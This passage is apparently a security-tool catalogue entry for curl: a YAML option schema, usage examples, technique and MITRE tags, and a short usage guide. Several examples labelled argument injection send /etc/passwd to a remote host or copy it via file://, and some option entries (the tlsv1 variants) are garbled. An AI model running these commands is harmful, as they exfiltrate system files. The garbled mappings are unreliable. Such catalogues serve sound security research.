  description: "--socks5-hostname <host[:port]> SOCKS5 proxy, pass hostname to proxy"
  aliases:
    - "-A"
    - "--socks5-gssapi-service <name>"
- name: socks5_hostname
  type: boolean
  required: false
  description: "SOCKS5 proxy, pass hostname to proxy"
  aliases:
    - "--socks5-hostname"
- name: speed-limit
  type: string
  required: false
  default: null
  description: "Stop transfers slower than this"
  aliases:
    - "-Y"
    - "--speed-limit <speed>"
- name: speed-time
  type: integer
  required: false
  default: null
  description: "Trigger 'speed-limit' abort after this time"
  aliases:
    - "-y"
    - "--speed-time <seconds>"
- name: ssl
  type: string
  required: false
  default: null
  description: "Try enabling TLS"
  aliases:
    - "--ssl"
- name: ssl-allow-beast
  type: string
  required: false
  default: null
  description: "Allow security flaw to improve interop"
  aliases:
    - "--ssl-allow-beast"
- name: ssl-auto-client-cert
  type: string
  required: false
  default: null
  description: "Use auto client certificate (Schannel)"
  aliases:
    - "--ssl-auto-client-cert"
- name: ssl-no-revoke
  type: string
  required: false
  default: null
  description: "Disable cert revocation checks (Schannel)"
  aliases:
    - "--ssl-no-revoke"
- name: ssl-reqd
  type: string
  required: false
  default: null
  description: "Require SSL/TLS"
  aliases:
    - "--ssl-reqd"
- name: ssl-revoke-best-effort
  type: string
  required: false
  default: null
  description: "Ignore missing cert CRL dist points"
  aliases:
    - "--ssl-revoke-best-effort"
- name: ssl-sessions
  type: string
  required: false
  default: null
  description: ""
  aliases:
    - "--ssl-sessions <filename>"
- name: sslv2
  type: string
  required: false
  default: null
  description: "SSLv2"
  aliases:
    - "-2"
    - "--sslv2"
- name: sslv3
  type: string
  required: false
  default: null
  description: "SSLv3"
  aliases:
    - "-3"
    - "--sslv3"
- name: stderr
  type: file
  required: false
  default: null
  description: "Where to redirect stderr"
  aliases:
    - "--stderr <file>"
- name: styled-output
  type: url
  required: false
  default: null
  description: "Enable styled output for HTTP headers"
  aliases:
    - "--styled-output"
- name: suppress-connect-headers
  type: string
  required: false
  default: null
  description: "Suppress proxy CONNECT response headers"
  aliases:
    - "--suppress-connect-headers"
- name: tcp-fastopen
  type: string
  required: false
  default: null
  description: "Use TCP Fast Open"
  aliases:
    - "--tcp-fastopen"
- name: tcp-nodelay
  type: string
  required: false
  default: null
  description: "Set TCP_NODELAY"
  aliases:
    - "--tcp-nodelay"
- name: telnet-option
  type: string
  required: false
  default: null
  description: "Set telnet option"
  aliases:
    - "-t"
    - "--telnet-option <opt"
- name: tftp-blksize
  type: string
  required: false
  default: null
  description: "Set TFTP BLKSIZE option"
  aliases:
    - "--tftp-blksize <value>"
- name: tftp-no-options
  type: string
  required: false
  default: null
  description: "Do not send any TFTP options"
  aliases:
    - "--tftp-no-options"
- name: time-cond
  type: number
  required: false
  default: null
  description: "Transfer based on a time condition"
  aliases:
    - "-z"
    - "--time-cond <time>"
- name: tls-earlydata
  type: string
  required: false
  default: null
  description: "Allow use of TLSv1.3 early data (0RTT)"
  aliases:
    - "--tls-earlydata"
- name: tls-max
  type: string
  required: false
  default: null
  description: "Maximum allowed TLS version"
  aliases:
    - "--tls-max <VERSION>"
- name: tls13-ciphers
  type: array
  required: false
  default: null
  description: "TLS 1.3 cipher suites to use"
  aliases:
    - "--tls13-ciphers <list>"
- name: tlsauthtype
  type: string
  required: false
  default: null
  description: "TLS authentication type"
  aliases:
    - "--tlsauthtype <type>"
- name: tlspassword
  type: string
  required: false
  default: null
  description: "TLS password"
  aliases:
    - "--tlspassword <string>"
- name: tlsuser
  type: string
  required: false
  default: null
  description: "TLS username"
  aliases:
    - "--tlsuser <name>"
- name: tlsv1
  type: string
  required: false
  default: null
  description: "TLSv1.0 or greater"
  aliases:
    - "-1"
    - "--tlsv1"
- name: tlsv1-2
  type: string
  required: false
  default: null
  description: "TLSv1.0 or greater"
  aliases:
    - "--tlsv1"
- name: tlsv1-3
  type: string
  required: false
  default: null
  description: "TLSv1.1 or greater"
  aliases:
    - "--tlsv1"
- name: tlsv1-4
  type: string
  required: false
  default: null
  description: "TLSv1.2 or greater"
  aliases:
    - "--tlsv1"
- name: tlsv1-5
  type: string
  required: false
  default: null
  description: "TLSv1.3 or greater"
  aliases:
    - "--tlsv1"
- name: tr-encoding
  type: string
  required: false
  default: null
  description: "Request compressed transfer encoding"
  aliases:
    - "--tr-encoding"
- name: trace
  type: file
  required: false
  default: null
  description: "Write a debug trace to FILE"
  aliases:
    - "--trace <file>"
- name: trace-ascii
  type: file
  required: false
  default: null
  description: "Like --trace, but without hex output"
  aliases:
    - "--trace-ascii <file>"
- name: trace-config
  type: string
  required: false
  default: null
  description: "Details to log in trace/verbose output"
  aliases:
    - "--trace-config <string>"
- name: trace-ids
  type: string
  required: false
  default: null
  description: "Transfer + connection ids in verbose output"
  aliases:
    - "--trace-ids"
- name: trace-time
  type: string
  required: false
  default: null
  description: "Add time stamps to trace/verbose output"
  aliases:
    - "--trace-time"
- name: unix-socket
  type: file
  required: false
  default: null
  description: "Connect through this Unix domain socket"
  aliases:
    - "--unix-socket <path>"
- name: upload-file
  type: file
  required: false
  default: null
  description: "Transfer local FILE to destination"
  aliases:
    - "-T"
    - "--upload-file <file>"
- name: upload-flags
  type: string
  required: false
  default: null
  description: "IMAP upload behavior"
  aliases:
    - "--upload-flags <flags>"
- name: url
  type: string
  required: false
  default: null
  description: "URL(s) to work with"
  aliases:
    - "--url <url/file>"
- name: url-query
  type: url
  required: false
  default: null
  description: "Add a URL query part"
  aliases:
    - "--url-query <data>"
- name: use-ascii
  type: string
  required: false
  default: null
  description: "Use ASCII/text transfer"
  aliases:
    - "-B"
    - "--use-ascii"
- name: user
  type: string
  required: false
  default: null
  description: "Server user and password"
  aliases:
    - "-u"
    - "--user <user:password>"
- name: user-agent
  type: string
  required: false
  default: null
  description: "Send User-Agent <name> to server"
  aliases:
    - "-A"
    - "--user-agent <name>"
- name: variable
  type: string
  required: false
  default: null
  description: ""
  aliases:
    - "--variable <[%]name"
- name: verbose
  type: string
  required: false
  default: null
  description: "Make the operation more talkative"
  aliases:
    - "-v"
    - "--verbose"
- name: version
  type: string
  required: false
  default: null
  description: "Show version number and quit"
  aliases:
    - "-V"
    - "--version"
- name: vlan-priority
  type: string
  required: false
  default: null
  description: "Set VLAN priority"
  aliases:
    - "--vlan-priority <priority>"
- name: write-out
  type: string
  required: false
  default: null
  description: "Output FORMAT after completion"
  aliases:
    - "-w"
    - "--write-out <format>"
- name: xattr
  type: string
  required: false
  default: null
  description: "Store metadata in extended file attributes"
  aliases:
    - "--xattr"

features:
- output-json
- streaming
- file-system
- network-intensive
execution:
  template: curl {abstract-unix-socket} {append} {aws-sigv4} {cert} {config}
  sandbox: execFile
  timeout_seconds: 60
  shell: true
global_vars:
  target: ip
  port: port
examples:
- description: Perform a simple GET request
  command: curl https://api.example.com/endpoint
- description: POST JSON data to an API
  command: 'curl -X POST -H ''Content-Type: application/json'' -d ''{"key":"value"}''
    https://api.example.com/submit'
- description: Download a file with progress
  command: curl -L -o file.zip https://example.com/file.zip
- description: Inspect response headers only
  command: curl -I https://example.com
- description: Send a local file to a remote server in a POST request.
  command: 'curl --data @/etc/passwd http://website.com/

    '
- description: Read local files by using the file:// schema.
  command: 'curl file:///etc/passwd

    '
- description: Downloads a file to a destination.
  command: 'curl http://website.com/ -o /tmp/

    '
- description: 'Argument injection: upload file: Send a local file to a remote server
    in a POST request.'
  command: curl --data @/etc/passwd http://website.com/
- description: 'Argument injection: upload file: Send a local file to a remote server
    in a POST request.'
  command: curl -F 'var=@/etc/passwd' http://website.com/
- description: 'Argument injection: upload file: Send a local file to a remote server
    in a POST request.'
  command: curl --upload-file /etc/passwd http://website.com/
- description: 'Argument injection: read local file: Read local files by using the
    file:// schema.'
  command: curl file:///etc/passwd
- description: 'Argument injection: download file: Downloads a file to a destination.'
  command: curl http://website.com/ -o /tmp/
- description: 'Argument injection: write to local file: Uses file-read to effectively
    copy files.'
  command: curl file:///etc/passwd -o /tmp/
- description: Download a file from a URL and save it with a specific name
  command: curl -o filename.ext http://example.com/file.txt
- description: Download a file from a URL and save it with the original filename
  command: curl -O http://example.com/file.txt
- description: Download a file and limit the download speed
  command: curl --limit-rate 100K http://example.com/file.txt
- description: Follow redirects if the URL has moved
  command: curl -L http://example.com
- description: Send POST data to a server
  command: curl -d "name=value" http://example.com/resource
- description: Send JSON data with a POST request
  command: 'curl -H "Content-Type: application/json" -d ''{"key":"value"}'' http://example.com/resource'
- description: Include headers in the output
  command: curl -i http://example.com
- description: Display only the HTTP headers for a GET request
  command: curl -I http://example.com
- description: Send a request with a custom header
  command: 'curl -H "Custom-Header: Value" http://example.com'
- description: Authenticate with a username and password
  command: curl -u username:password http://example.com
- description: Use a different request method like PUT or DELETE
  command: curl -X PUT http://example.com/resource
- description: Download multiple URLs in sequence
  command: curl -O http://example.com/file1.txt -O http://example.com/file2.txt
- description: Resume a failed or interrupted download
  command: curl -C - -O http://example.com/largefile.zip
- description: Transfer a file using FTP
  command: curl -T localfile.txt ftp://ftp.example.com/upload/
- description: Specify a proxy for the request
  command: curl -x http://proxy-server:port http://example.com
- description: Send data with the URL encoded format
  command: curl --data-urlencode "key=value" http://example.com/resource
- description: Save the response headers to a file
  command: curl -D headers.txt http://example.com
- description: Download a file and run it through a pipe (e.g., to `grep`)
  command: curl http://example.com/file.txt | grep "search-string"
references:
- label: Official curl documentation
  url: https://curl.se/docs/manpage.html
- label: Everything curl book
  url: https://everything.curl.dev/
techniques:
- command-and-control
- discovery
- enumeration
- collection
- data-manipulation
- exfiltration
install:
- method: apt
  package_name: curl
  commands:
  - apt-get install -y curl
- method: brew
  package_name: curl
  commands:
  - brew install curl
mitre_ids:
- T1005
- T1046
- T1048
- T1074
- T1114
- T1190
- T1595
---

# curl — Data Transfer Client

curl is a command-line tool for transferring data using URL syntax, supporting a wide range of protocols including HTTP, HTTPS, FTP, SFTP, SCP, LDAP, and more. It is one of the most widely used and versatile networking utilities available.

## Core Concepts

curl operates on a simple principle: provide a URL and optional configuration flags, and it will transfer data to or from that endpoint. It supports every major authentication method, protocol variant, and data encoding scheme.

### Request Methods

The HTTP method defines the type of operation curl performs:

| Method   | Purpose                       | Common Use Case              |
|----------|-------------------------------|------------------------------|
| `GET`    | Retrieve data                 | API queries, page downloads  |
| `POST`   | Submit new data               | Form submissions, API writes |
| `PUT`    | Replace existing data         | Resource updates             |
| `DELETE` | Remove a resource             | API deletions                |
| `PATCH`  | Partial resource modification | Incremental updates          |
| `HEAD`   | Retrieve headers only         | Link checking, metadata      |

## Common Usage Patterns

### API Testing

curl is the de facto standard for API testing from the command line:

```bash
# Authenticated API call with bearer token
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
     -H "Accept: application/json" \
     https://api.example.com/v1/users

# GraphQL query
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "query { users { id name } }"}' \
  https://api.example.com/graphql
```

### File Transfer

```bash
# Resume an interrupted download
curl -C - -o largefile.iso https://example.com/largefile.iso

# Upload a file via FTP
curl -T localfile.txt ftp://ftp.example.com/upload/
```

### Debugging and Inspection

```bash
# Verbose output showing full request/response
curl -v https://example.com

# Trace with timing breakdown
curl -w "\nTime: %{time_total}s\n" https://example.com
```

## Security Considerations

- Use `-k`/`--insecure` only for testing; never in production scripts
- Always verify SSL certificates in automated workflows
- Be aware that `-d` data appears in process listings; use `--data-urlencode` for sensitive payloads
- Prefer environment variables or `.netrc` files over inline credentials

## Related Tools

- **[wget](../traffic/wget.md)** — Alternative download tool with recursive capabilities
- **[httpie](../http/httpie.md)** — Human-friendly HTTP client with syntax highlighting
- **[jq](../text/jq.md)** — JSON processor for post-processing curl output
